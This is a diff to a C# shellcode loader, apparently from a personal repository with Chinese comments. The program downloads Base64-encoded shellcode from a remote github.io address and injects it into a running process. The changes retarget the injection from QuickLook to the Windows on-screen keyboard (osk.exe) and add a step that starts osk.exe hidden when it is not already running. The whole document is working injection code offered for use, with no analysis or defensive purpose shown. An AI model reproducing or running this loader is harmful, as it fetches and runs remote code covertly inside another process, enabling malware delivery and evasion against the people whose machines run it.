@@ -4,16 +4,16 @@ using System.Runtime.InteropServices;
 using System.IO;
 using System.Text;
 using System.Net;
+using System.Threading;
 
 //主空间
 namespace ToDe1ta
 {
     public class Program
     {
-
-        static string shellcodeUrl = "https://github.com/me2hk/De1ta/raw/refs/heads/main/ShellCode.txt";        // 在线获取shellcode的URL
-        static string targetProcessName = "QuickLook";                                                          // 注入目标进程名称
-        static bool injectionSuccess = false;                                                                  // 注入成功标志
+        static string shellcodeUrl = "https://me2hk.github.io/";                                                // 在线获取shellcode的URL
+        static string targetProcessName = "osk";                                                                // 注入目标进程名称
+        static bool injectionSuccess = false;                                                                   // 注入成功标志
 
         //主入口
         static void Main(string[] args)
@@ -24,20 +24,28 @@ namespace ToDe1ta
                 ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
 
                 // 在线获取shellcode的Base64编码
-                string base64Shellcode = DownloadString(shellcodeUrl); ;
+                string base64Shellcode = DownloadString(shellcodeUrl); 
                 byte[] shellcode = Convert.FromBase64String(base64Shellcode);
 
-                // 获取QuickLook进程的PID
+                // 获取osk进程的PID
                 int pid = GetProcessPidByName(targetProcessName);
+
+                // 如果未找到进程，则隐藏启动它
                 if (pid == -1)
                 {
-                    //未找到进程
-                    ShowMessageBox("关于", string.Format("          未找到进程: {0}"+".exe", targetProcessName));
-                    Console.ReadLine();
-                    return;
-                }
+                    StartProcessHidden("osk.exe");
+                    // 等待进程启动
+                    Thread.Sleep(2000);
 
-                // 找到进程
+                    // 再次尝试获取PID
+                    pid = GetProcessPidByName(targetProcessName);
+
+                    if (pid == -1)
+                    {
+                        Console.WriteLine("无法启动或找到osk进程");
+                        return;
+                    }
+                }
 
                 // 注入shellcode到目标进程
                 if (Inject(shellcode, pid) == 0)
@@ -74,6 +82,27 @@ namespace ToDe1ta
                 ShowMessageBox("关于", string.Format("程序执行过程中发生错误: {0}", ex.Message));
 
                 Console.ReadLine();
+            }
+        }
+
+        // 隐藏启动进程的方法
+        static void StartProcessHidden(string processName)
+        {
+            try
+            {
+                ProcessStartInfo startInfo = new ProcessStartInfo
+                {
+                    FileName = Path.Combine(Environment.SystemDirectory, processName),
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    CreateNoWindow = true
+                };
+
+                Process.Start(startInfo);
+                Console.WriteLine("已隐藏启动进程: " + processName);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("启动进程失败: " + ex.Message);
             }
         }
 
